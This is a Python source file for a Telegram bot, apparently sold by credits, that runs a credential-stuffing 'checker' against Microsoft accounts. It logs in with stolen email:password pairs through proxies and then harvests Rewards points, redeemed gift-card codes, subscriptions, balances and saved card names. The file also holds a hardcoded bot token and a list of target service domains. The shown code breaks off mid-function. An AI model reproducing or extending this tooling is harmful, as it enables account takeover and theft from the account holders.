import re, json, uuid, sqlite3, logging, asyncio, time, os, random, threading, requests, urllib3
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import quote, unquote, urlparse, parse_qs
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from telegram import (Update, InlineKeyboardButton, InlineKeyboardMarkup)
from telegram.ext import (Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters)

# ============================================================================
# SECTION 2 — IMPORTS & SETUP
# ============================================================================
urllib3.disable_warnings()
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ============================================================================
# SECTION 3 — CONFIG CONSTANTS
# ============================================================================
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak')
ADMIN_ID = int(os.environ.get('ADMIN_ID', '5944410248'))
DB = os.environ.get('DB_PATH', 'checker.db')
MAX_EXECUTOR_WORKERS = 500

# flux.py login URL — DO NOT CHANGE
SFTAG_URL = (
    'https://login.live.com/oauth20_authorize.srf'
    '?client_id=00000000402B5328'
    '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
    '&scope=service::user.auth.xboxlive.com::MBI_SSL'
    '&display=touch&response_type=token&locale=en'
)

# Global proxy list
PROXIES_LIST = []

# Global thread pool
bot_executor = ThreadPoolExecutor(max_workers=MAX_EXECUTOR_WORKERS)
db_lock = threading.Lock()

# Code patterns for extracting codes (flux.py)
CODE_PATTERNS = [
    r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',  # 5-part
    r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',              # 4-part
    r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',                          # 3-part
]

# Exclusion list for codes (flux.py)
EXCLUDE_WORDS = {
    'SWEEPSTAKES', 'STATUS', 'WINORDER', 'CONTEST', 'PLAGUE', 'REQUIEM', 'CUSTOM', 'BUNDLEORDER', 'SURFACE', 'PROORDER', 'SERIES', 'POINTS',
    'DONATION', 'CHILDREN', 'RESEARCH', 'HOSPITALORDE', 'EDUCATION', 'EMPLOYMENTOR', 'RIGHTS', 'YOUORDER', 'SEDSORDER', 'ATAORDER',
    'CARDORDER', 'MICROSOFT', 'PRESENTKORT', 'KRORDER', 'OFT-PRE', 'DIGITAL', 'COINSORDER', 'MOEDAS', 'OVERWATCHORD', 'MONEDASORDER',
    'ASSINATURA', 'GRATUITA', 'SPOTIFY', 'PREMIUM', 'MESESORDER', 'PRESENTE', 'RESALET', 'NOURORDER', 'FOUNDATIONOR', 'YACOUB',
    'LEAGUE', 'LEGENDS', 'RPORDER', 'OVERWATCH', 'GAME', 'PASS', 'MINECOINS', 'ROBUX', 'GIFT', 'CARD', 'ORDER', 'CODE', 'FOUND',
    'DIGITAL-CODE', 'REDEMPTION', 'REDEEM', 'DOWNLOAD', 'INSTANT', 'DELIVERY', 'ONLINE', 'ACCESS', 'CONTENT', 'DLC', 'EXPANSION',
    'SEASON', 'TOKEN', 'CURRENCY', 'VIRTUAL', 'ITEM'
}

# ============================================================================
# SECTION 4 — AkazaDatabase CLASS
# ============================================================================
class AkazaDatabase:
    def __init__(self, db_path):
        self.db_path = db_path

    def _execute(self, query, params=(), commit=True, fetchone=False, fetchall=False):
        with db_lock:
            conn = sqlite3.connect(self.db_path)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            try:
                cursor.execute(query, params)
                if commit: conn.commit()
                if fetchone: return cursor.fetchone()
                if fetchall: return cursor.fetchall()
            except Exception as e:
                logger.error(f"DB Error: {e}")
            finally: conn.close()

    def init_db(self):
        self._execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
            credits INTEGER DEFAULT 0, has_access INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0, is_mod INTEGER DEFAULT 0,
            total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0,
            join_date TEXT, access_expiry TEXT)''')
        self._execute('''CREATE TABLE IF NOT EXISTS settings (
            user_id INTEGER PRIMARY KEY, keywords TEXT DEFAULT "", threads INTEGER DEFAULT 10, is_adding_kw INTEGER DEFAULT 0, fast_mode INTEGER DEFAULT 0)''')
        self._execute('''CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email TEXT,
            status TEXT, details TEXT, date TEXT)''')
        self.add_user(ADMIN_ID, "Admin", "Admin")
        self._execute('UPDATE users SET is_mod = 1, has_access = 1, credits = 999999 WHERE user_id = ?', (ADMIN_ID,))

    def add_user(self, uid, username, first_name):
        now = datetime.now().isoformat()
        self._execute('INSERT OR IGNORE INTO users (user_id, username, first_name, join_date) VALUES (?, ?, ?, ?)', (uid, username, first_name, now))
        self._execute('INSERT OR IGNORE INTO settings (user_id) VALUES (?)', (uid,))

    def is_banned(self, uid) -> bool:
        res = self._execute('SELECT is_banned FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return bool(res['is_banned']) if res else False

    def has_access(self, uid) -> bool:
        if uid == ADMIN_ID: return True
        res = self._execute('SELECT has_access, access_expiry, is_banned FROM users WHERE user_id = ?', (uid,), fetchone=True)
        if not res or res['is_banned']: return False
        if res['has_access'] == 0: return False
        if res['access_expiry']:
            try:
                if datetime.now() > datetime.fromisoformat(res['access_expiry']): return False
            except: pass
        return True

    def is_mod(self, uid) -> bool:
        if uid == ADMIN_ID: return True
        res = self._execute('SELECT is_mod FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return bool(res['is_mod']) if res else False

    def add_credits(self, uid, amount):
        self._execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (amount, uid))

    def set_credits(self, uid, amount):
        self._execute('UPDATE users SET credits = ? WHERE user_id = ?', (amount, uid))

    def reset_credits(self, uid):
        self._execute('UPDATE users SET credits = 0 WHERE user_id = ?', (uid,))

    def use_credit(self, uid):
        if uid == ADMIN_ID: return
        self._execute('UPDATE users SET credits = MAX(0, credits - 1), total_checks = total_checks + 1 WHERE user_id = ?', (uid,))

    def get_credits(self, uid) -> int:
        if uid == ADMIN_ID: return 999999
        res = self._execute('SELECT credits FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return res['credits'] if res else 0

    def grant_access(self, uid):
        self._execute('UPDATE users SET has_access = 1, access_expiry = NULL WHERE user_id = ?', (uid,))

    def revoke_access(self, uid):
        self._execute('UPDATE users SET has_access = 0 WHERE user_id = ?', (uid,))

    def grant_timed_access(self, uid, days):
        expiry = (datetime.now() + timedelta(days=days)).isoformat()
        self._execute('UPDATE users SET has_access = 1, access_expiry = ? WHERE user_id = ?', (expiry, uid))

    def ban(self, uid):
        self._execute('UPDATE users SET is_banned = 1 WHERE user_id = ?', (uid,))

    def unban(self, uid):
        self._execute('UPDATE users SET is_banned = 0 WHERE user_id = ?', (uid,))

    def set_mod(self, uid, val):
        self._execute('UPDATE users SET is_mod = ? WHERE user_id = ?', (val, uid))

    def get_all_user_ids(self) -> list:
        res = self._execute('SELECT user_id FROM users', fetchall=True)
        return [row['user_id'] for row in res] if res else []

    def get_user_info(self, uid) -> dict:
        res = self._execute('SELECT * FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return dict(res) if res else {}

    def get_user_settings(self, uid) -> dict:
        res = self._execute('SELECT keywords, threads, is_adding_kw, fast_mode FROM settings WHERE user_id = ?', (uid,), fetchone=True)
        if res:
            kws = [k.strip() for k in res['keywords'].split(',') if k.strip()]
            return {'keywords': kws, 'threads': res['threads'], 'is_adding_kw': bool(res['is_adding_kw']), 'fast_mode': bool(res['fast_mode'])}
        return {'keywords': [], 'threads': 10, 'is_adding_kw': False, 'fast_mode': False}

    def update_settings(self, uid, keywords=None, threads=None, is_adding_kw=None, fast_mode=None):
        if keywords is not None: self._execute('UPDATE settings SET keywords = ? WHERE user_id = ?', (",".join(keywords), uid))
        if threads is not None: self._execute('UPDATE settings SET threads = ? WHERE user_id = ?', (threads, uid))
        if is_adding_kw is not None: self._execute('UPDATE settings SET is_adding_kw = ? WHERE user_id = ?', (1 if is_adding_kw else 0, uid))
        if fast_mode is not None: self._execute('UPDATE settings SET fast_mode = ? WHERE user_id = ?', (1 if fast_mode else 0, uid))

    def save_result(self, uid, email, status, details_dict):
        now = datetime.now().isoformat()
        self._execute('INSERT INTO results (user_id, email, status, details, date) VALUES (?, ?, ?, ?, ?)', (uid, email, status, json.dumps(details_dict), now))
        if status == 'hit': self._execute('UPDATE users SET total_hits = total_hits + 1 WHERE user_id = ?', (uid,))

    def user_stats(self, uid) -> dict:
        res = self._execute('SELECT total_checks, total_hits, credits FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return {'checks': res['total_checks'], 'hits': res['total_hits'], 'credits': res['credits']} if res else {'checks': 0, 'hits': 0, 'credits': 0}

    def get_global_stats(self) -> dict:
        t = self._execute('SELECT COUNT(*) as total FROM users', fetchone=True)
        a = self._execute('SELECT COUNT(*) as active FROM users WHERE has_access = 1 AND is_banned = 0', fetchone=True)
        c = self._execute('SELECT SUM(total_checks) as checks FROM users', fetchone=True)
        h = self._execute('SELECT SUM(total_hits) as hits FROM users', fetchone=True)
        return {'total': t['total'] if t else 0, 'active': a['active'] if a else 0, 'checks': c['checks'] if c and c['checks'] else 0, 'hits': h['hits'] if h and h['hits'] else 0}

    def list_mods(self) -> list:
        res = self._execute('SELECT user_id, username FROM users WHERE is_mod = 1', fetchall=True)
        return [{'uid': row['user_id'], 'username': row['username']} for row in res] if res else []

akaza_db = AkazaDatabase(DB)

# ============================================================================
# SECTION 5 — TARGET DOMAINS & COMPANIES
# ============================================================================
TARGET_DOMAINS = {
    # Gaming - Domain Focus
    "@roblox.com": "Roblox",
    "@steampowered.com": "Steam",
    "@epicgames.com": "Epic Games",
    "@riotgames.com": "Riot Games",
    "@ubisoft.com": "Ubisoft",
    "@ea.com": "EA",
    "@blizzard.com": "Blizzard",
    "@id.supercell.com": "Supercell",
    "@txn-email.playstation.com": "PlayStation",
    "@sony.com": "Sony/PSN",
    "@minecraft.net": "Minecraft",
    "@mojang.com": "Mojang",
    "@xbox.com": "Xbox",
    "@microsoft.com": "Microsoft",
    # Streaming & Digital
    "@netflix.com": "Netflix",
    "@spotify.com": "Spotify",
    "@disneyplus.com": "Disney+",
    "@hulu.com": "Hulu",
    "@hbo.com": "HBO",
    "@amazon.com": "Amazon",
    "@apple.com": "Apple",
    "@account.tiktok.com": "TikTok",
    "@instagram.com": "Instagram",
    "@facebookmail.com": "Facebook",
}

# ============================================================================
# SECTION 6 — AkazaChecker CLASS (fully integrated: flux.py + hit.py + p7.py)
# ============================================================================
class AkazaChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            p = self.format_proxy(proxy)
            self.session.proxies = {'http': p, 'https': p}
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0'
        })

    def format_proxy(self, px):
        px = px.strip()
        if px.startswith(('http://', 'https://', 'socks')): return px
        p = px.split(':')
        if len(p) == 4: return f'http://{p[2]}:{p[3]}@{p[0]}:{p[1]}'
        return f'http://{px}' if len(p) == 2 else px

    # ── XBOX RPS LOGIN (flux.py exact) ─────────────────────────────────────
    def get_sftag_params(self):
        for _ in range(3):
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
                           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                           'Accept-Language': 'en-US,en;q=0.9', 'Connection': 'keep-alive'}
                text = self.session.get(SFTAG_URL, headers=headers, timeout=10, verify=False).text
                ppft_m = (re.search(r'value=\\\"(.+?)\\\"', text, re.S) or
                          re.search(r'value="(.+?)"', text, re.S) or
                          re.search(r"sFTTag:'(.+?)'", text, re.S) or
                          re.search(r'sFTTag:"(.+?)"', text, re.S) or
                          re.search(r'name="PPFT".*?value="(.+?)"', text, re.S))
                if ppft_m:
                    ppft = ppft_m.group(1)
                    up_m = (re.search(r'"urlPost":"(.+?)"', text, re.S) or
                            re.search(r"urlPost:'(.+?)'", text, re.S) or
                            re.search(r'urlPost:"(.+?)"', text, re.S) or
                            re.search(r'<form.*?action="(.+?)"', text, re.S))
                    if up_m: return up_m.group(1).replace('&amp;', '&'), ppft
            except: pass
            time.sleep(0.1)
        return None, None

    def do_login(self, email, password, urlPost, ppft):
        for _ in range(3):
            try:
                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft}
                headers = {'Content-Type': 'application/x-www-form-urlencoded',
                           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                           'Connection': 'close'}
                r = self.session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=12, verify=False)
                if '#' in r.url and r.url != SFTAG_URL:
                    tk = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
                    if tk and tk != 'None': return ('TOKEN', tk)
                elif 'cancel?mkt=' in r.text:
                    try:
                        ipt = re.search(r'name="ipt".*?value="(.+?)"', r.text).group(1)
                        pprid = re.search(r'name="pprid".*?value="(.+?)"', r.text).group(1)
                        uaid = re.search(r'name="uaid".*?value="(.+?)"', r.text).group(1)
                        act = re.search(r'id="fmHF".*?action="(.+?)"', r.text).group(1)
                        r2 = self.session.post(act, data={'ipt': ipt, 'pprid': pprid, 'uaid': uaid}, allow_redirects=True, timeout=10, verify=False)
                        ru = re.search(r'"recoveryCancel":{"returnUrl":"(.+?)"', r2.text).group(1)
                        r3 = self.session.get(ru, allow_redirects=True, timeout=10, verify=False)
                        tk = parse_qs(urlparse(r3.url).fragment).get('access_token', [None])[0]
                        if tk and tk != 'None': return ('TOKEN', tk)
                    except: pass
                if any(v in r.text for v in ['recover?mkt', 'identity/confirm', 'Email/Confirm', '/Abuse?mkt=']): return ('2FA', None)
                if any(v in r.text.lower() for v in ['password is incorrect', "account doesn't exist", 'too many times', 'help us protect']): return ('BAD', None)
            except: pass
        return ('ERROR', None)

    def handle_fmhf(self, resp):
        for _ in range(5):
            if 'fmHF' not in resp.text: break
            soup = BeautifulSoup(resp.text, 'html.parser')
            form = soup.find('form', id='fmHF')
            if not form: break
            data = {i.get('name'): i.get('value', '') for i in form.find_all('input') if i.get('name')}
            action = form.get('action', '')
            if action.startswith('/'): action = 'https://login.live.com' + action
            try: resp = self.session.post(action, data=data, verify=False, timeout=10)
            except: break
        return resp

    # ── OUTLOOK OAUTH2 LOGIN (p7.py / hit.py exact) ────────────────────────
    def _outlook_login(self, email, password):
        """Login via Outlook OAuth2 — returns (access_token, cid) or (None, None)"""
        try:
            # IDP check (p7.py step 1)
            r1 = self.session.get(
                f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}",
                headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                         "Host": "odc.officeapps.live.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"},
                timeout=10, verify=False)
            if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
                return None, None

            time.sleep(0.3)

            # OAuth2 authorize page (p7.py step 2)
            auth_url = ("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
                        "?client_info=1&haschrome=1"
                        f"&login_hint={quote(email)}"
                        "&mkt=en&response_type=code"
                        "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                        "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                        "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D")
            r2 = self.session.get(auth_url,
                                  headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                                           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
                                  timeout=15, verify=False)

            # Parse urlPost and PPFT (p7.py combined methods)
            um = re.search(r'"urlPost":"([^"]+)"', r2.text)
            if not um:
                # fallback raw split
                if '"urlPost":"' in r2.text:
                    um_raw = r2.text.split('"urlPost":"')[1].split('"')[0]
                    post_url = um_raw.replace('\\/', '/')
                else:
                    return None, None
            else:
                post_url = um.group(1).replace('\\/', '/')

            # PPFT: try multiple patterns (p7.py)
            ppft = None
            for ppft_pat in [
                r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)\\"',
                r'name="PPFT" id="i0327" value="([^"]+)"',
                r'"sFTTag":".*?value=\\"([^"]+)\\"',
                r'name="PPFT".*?value="([^"]+)"',
            ]:
                m = re.search(ppft_pat, r2.text)
                if m: ppft = m.group(1); break
            if not ppft: return None, None

            # Submit credentials (p7.py step 3)
            login_data = (f"i13=1&login={quote(email)}&loginfmt={quote(email)}&type=11&LoginOptions=1"
                          f"&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={quote(password)}"
                          f"&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx="
                          f"&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs="
                          f"&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0"
                          f"&isRecoveryAttemptPost=0&i19=9960")
            r3 = self.session.post(post_url, data=login_data,
                                   headers={"Content-Type": "application/x-www-form-urlencoded",
                                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                                            "Origin": "https://login.live.com"},
                                   allow_redirects=False, timeout=15, verify=False)

            resp_low = r3.text.lower()
            if any(x in resp_low for x in ["account or password is incorrect", "password is incorrect", "doesn't exist"]):
                return None, None
            if any(x in r3.text for x in ["identity/confirm", "Consent", "/Abuse"]):
                return None, None

            # Extract auth code
            loc = r3.headers.get("Location", "")
            cm = re.search(r'code=([^&"\']+)', loc)
            if not cm:
                cm = re.search(r'code=([^&"\']+)', r3.text)
            if not cm: return None, None

            cid = ""
            for ck in self.session.cookies:
                if ck.name == "MSPCID": cid = ck.value.upper(); break
            if not cid: cid = self.session.cookies.get("MSPCID", "").upper()

            # Token exchange (p7.py step 4)
            token_data = {
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": cm.group(1),
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
                "client_info": "1"
            }
            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                                   data=token_data,
                                   headers={"Content-Type": "application/x-www-form-urlencoded"},
                                   timeout=15, verify=False)
            if r4.status_code != 200 or "access_token" not in r4.text: return None, None
            tok = r4.json().get("access_token")
            return (tok, cid) if tok else (None, None)
        except Exception as e:
            logger.debug(f"Outlook login error {email}: {e}")
            return None, None

    # ── REWARDS POINTS (Optimized: Method 1, 2, 3) ──────────────────────────
    def get_rewards_points(self):
        """Optimized points fetching with session establishment"""
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "Referer": "https://rewards.bing.com/"
            }
            # Step 0: Establish rewards session (fmHF handle)
            try:
                r_init = self.session.get("https://rewards.bing.com", headers=headers, timeout=10, verify=False)
                self.handle_fmhf(r_init)
            except: pass

            # Method 1: Primary Bing API
            try:
                r = self.session.get("https://rewards.bing.com/api/getuserinfo", headers=headers, timeout=8, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    pts = data.get('availablePoints') or data.get('dashboard', {}).get('userStatus', {}).get('availablePoints')
                    if pts is not None: return int(pts)
            except: pass

            # Method 2: Flyout API
            try:
                r = self.session.get("https://www.bing.com/rewardsapp/flyoutHub?format=json", headers=headers, timeout=8, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    if 'userInfo' in data and 'balance' in data['userInfo']: return int(data['userInfo']['balance'])
            except: pass

            # Method 3: Page scraping
            try:
                r = self.session.get("https://rewards.bing.com", headers=headers, timeout=10, verify=False)
                if r.status_code == 200:
                    match = re.search(r'"availablePoints"\s*:\s*(\d+)', r.text)
                    if match:
                        points = int(match.group(1))
                        if 0 <= points <= 500000: return points
            except: pass
        except: pass
        return 0

    # ── REDEMPTION CODES (flux.py full logic) ──────────────────────────────
    def get_redemption_codes(self):
        codes = []
        try:
            r = self.handle_fmhf(self.session.get('https://rewards.bing.com/redeem/orderhistory',
                                                   headers={'Referer': 'https://rewards.bing.com/'}, timeout=12, verify=False))
            soup = BeautifulSoup(r.text, 'html.parser')
            vt_input = soup.find('input', attrs={'name': '__RequestVerificationToken'})
            vt = vt_input.get('value', '') if vt_input else ''
            table = soup.find('table', class_='table')
            rows = []
            if table and table.find('tbody'): rows = table.find('tbody').find_all('tr')
            elif table: rows = table.find_all('tr')
            for row in rows:
                cells = row.find_all(['td', 'th'])
                if len(cells) < 3: continue
                title = cells[2].get_text(strip=True)
                date  = cells[1].get_text(strip=True)
                cat   = self.detect_category(title, row.get_text(strip=True))
                btn   = row.find('button', id=lambda x: x and x.startswith('OrderDetails_'))
                if btn:
                    act = btn.get('data-actionurl', '').replace('&amp;', '&')
                    if act.startswith('/'): act = 'https://rewards.bing.com' + act
                    try:
                        cr = self.session.post(act, data={'__RequestVerificationToken': vt},
                                               headers={'X-Requested-With': 'XMLHttpRequest',
                                                        'Content-Type': 'application/x-www-form-urlencoded'},
                                               timeout=12, verify=False).text
                    except: continue
                    csoup  = BeautifulSoup(cr, 'html.parser')
                    code_v = None

                    # a. resendSuccess tango div
                    rs = csoup.find('div', class_='resendSuccess')
                    if rs:
                        tk_divs = rs.find_all('div', class_=re.compile(r'tango-credential-key', re.I))
                        tv_divs = rs.find_all('div', class_=re.compile(r'tango-credential-value', re.I))
                        for k, v in zip(tk_divs, tv_divs):
                            kt = k.get_text(strip=True).upper()
                            if 'CODE' in kt or 'PIN' in kt:
                                cv = v.get_text(strip=True)
                                if cv and '*' not in cv: code_v = cv; break

                    # b. Multi-pattern code extraction
                    if not code_v:
                        for pat in CODE_PATTERNS:
                            m = re.search(pat, cr)
                            if m and '*' not in m.group() and m.group().upper() not in EXCLUDE_WORDS:
                                code_v = m.group(); break

                    # c. PIN:/CODE: label
                    if not code_v:
                        m = re.search(r'(?:PIN|CODE)\s*:\s*([A-Z0-9]{4}[A-Z0-9\-]{8,})', cr, re.I)
                        if m and '*' not in m.group(1): code_v = m.group(1)

                    # d. Clipboard button
                    if not code_v:
                        for cb in csoup.find_all('button', attrs={'data-clipboard-text': True}):
                            val = cb.get('data-clipboard-text', '').strip()
                            if val and len(val) >= 12 and '*' not in val: code_v = val; break

                    # e. pre/code tags
                    if not code_v:
                        for tag in csoup.find_all(['pre', 'code']):
                            txt = tag.get_text(strip=True)
                            for pat in CODE_PATTERNS:
                                if re.fullmatch(pat, txt) and '*' not in txt: code_v = txt; break
                            if code_v: break

                    # Redemption URL
                    ru = ''
                    for rp in [r"""<a[^>]*href=['"]([^'"]+)['"][^>]*>\s*Redemption URL\s*</a>""",
                                r'href="([^"]*redeem[^"]*)"', r'href="([^"]*claim[^"]*)"',
                                r'Redemption URL[:\s]+(https?://[^\s<>"]+)']:
                        rm = re.search(rp, cr, re.IGNORECASE)
                        if rm: ru = rm.group(1).strip(); break

                    if code_v:
                        codes.append({'code': code_v, 'category': cat, 'redemption_url': ru, 'date': date})
                else:
                    # No button — direct cell text
                    code_text = cells[3].get_text(strip=True) if len(cells) > 3 else cells[2].get_text(strip=True)
                    for pat in CODE_PATTERNS:
                        m = re.search(pat, code_text)
                        if m and '*' not in m.group() and m.group().upper() not in EXCLUDE_WORDS:
                            codes.append({'code': m.group(), 'category': cat, 'redemption_url': '', 'date': date}); break
        except Exception as e:
            logger.debug(f"get_redemption_codes error: {e}")
        return codes

    def detect_category(self, title, row_text=''):
        t = (title + ' ' + row_text).lower()
        if 'overwatch' in t: return 'Overwatch'
        if 'sea of thieves' in t or 'ancient coins' in t: return 'Sea of Thieves'
        if 'roblox' in t or 'robux' in t: return 'Roblox'
        if 'league' in t or 'riot' in t or ' lol ' in t: return 'League of Legends'
        if 'game pass' in t or 'gamepass' in t: return 'Game Pass'
        if 'minecraft' in t or 'minecoins' in t: return 'Minecraft'
        if any(x in t for x in ['gift card', 'giftcard', 'amazon', 'xbox', 'nintendo', 'playstation',
                                 'starbucks', 'walmart', 'subway', 'doordash', 'uber', 'target', 'spotify']): return 'Gift Card'
        if 'steam' in t: return 'Steam Gift Card'
        return 'Unknown'

    # ── MICROSOFT SUBSCRIPTIONS (hit.py enhanced) ──────────────────────────
    def get_microsoft_subs(self):
        try:
            uid = str(uuid.uuid4()).replace('-', '')[:16]
            u = (f"https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A"
                 f"&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
                 f"&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
                 f"&state={quote(json.dumps({'userId': uid, 'scopeSet': 'pidl'}))}&prompt=none")
            r = self.session.get(u, headers={"Referer": "https://account.microsoft.com/"}, timeout=15, verify=False)
            tk_m = re.search(r'access_token=([^&\s"\']+)', r.text + " " + r.url)
            if not tk_m: return {"status": "FREE", "subs": [], "balance": "", "card": ""}
            tk = unquote(tk_m.group(1))
            h = {"Authorization": f'MSADELEGATE1.0="{tk}"', "ms-cV": str(uuid.uuid4()),
                 "Origin": "https://account.microsoft.com", "Referer": "https://account.microsoft.com/"}
            bal_r = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
                                     headers=h, timeout=12, verify=False).text
            bal_m  = re.search(r'"balance"\s*:\s*([0-9.]+)', bal_r)
            card_m = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', bal_r, re.S)
            rt = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
                                  headers=h, timeout=12, verify=False).text
            subs = []
            sub_keys = {'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE', 'PC Game Pass': 'PC GAME PASS',
                        'Xbox Game Pass': 'GAME PASS', 'EA Play': 'EA PLAY', 'Xbox Live Gold': 'XBOX LIVE GOLD',
                        'Microsoft 365 Family': 'M365 FAMILY', 'Microsoft 365 Personal': 'M365 PERSONAL',
                        'Office 365': 'OFFICE 365', 'OneDrive': 'ONEDRIVE'}
            for k, disp in sub_keys.items():
                if k in rt:
                    si = {'name': disp, 'is_expired': False}
                    rd_m = re.search(rf'"{re.escape(k)}".*?"nextRenewalDate"\s*:\s*"([^T"]+)', rt, re.S)
                    if rd_m:
                        si['renewal_date'] = rd_m.group(1)
                        try:
                            rem = (datetime.fromisoformat(rd_m.group(1)) - datetime.now()).days
                            si['days_remaining'] = rem
                            if rem < 0: si['is_expired'] = True
                        except: pass
                    ar_m = re.search(r'"autoRenew"\s*:\s*(true|false)', rt)
                    if ar_m: si['auto_renew'] = 'YES' if ar_m.group(1) == 'true' else 'NO'
                    amt_m = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', rt)
                    if amt_m: si['amount'] = amt_m.group(1)
                    cur_m = re.search(r'"currency"\s*:\s*"([^"]+)"', rt)
                    if cur_m: si['currency'] = cur_m.group(1)
                    subs.append(si)
            return {"status": "PREMIUM" if subs else "FREE", "subs": subs,
                    "balance": "$" + bal_m.group(1) if bal_m else "",
                    "card": card_m.group(1) if card_m else ""}
        except: return {"status": "FREE", "subs": [], "balance": "", "card": ""}

    # ── PROFILE (using Outlook token) ──────────────────────────────────────
    def get_profile(self, tk, cid):
        try:
            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}',
                 'User-Agent': 'Outlook-Android/2.0'}
            r = self.session.get('https://substrate.office.com/profileb2/v2.0/me/V1Profile',
                                 headers=h, timeout=12, verify=False)
            if r.status_code == 200:
                d = r.json()
                name = d.get('displayName', '') or d.get('names', [{}])[0].get('displayName', 'N/A')
                country = (d.get('geography', {}).get('country') or
                           d.get('location', {}).get('country') or 'N/A')
                return name or 'N/A', country
        except: pass
        return 'N/A', 'N/A'

    # ── XBOX PROFILE (Gamertag, Gamerscore, Tier) ──────────────────────────
    def get_xbox_profile(self, xbox_tk):
        """Fetch Xbox Profile details using XSTS token"""
        try:
            if not xbox_tk: return {"gt": "N/A", "score": 0, "tier": "N/A"}
            h = {
                "x-xbl-contract-version": "2",
                "Authorization": f"XBL3.0 x={xbox_tk['user_hash']};{xbox_tk['token']}",
                "Accept-Language": "en-US",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            # Need to get XSTS for profile scope first? Usually xbox_token is already XSTS if produced by do_login
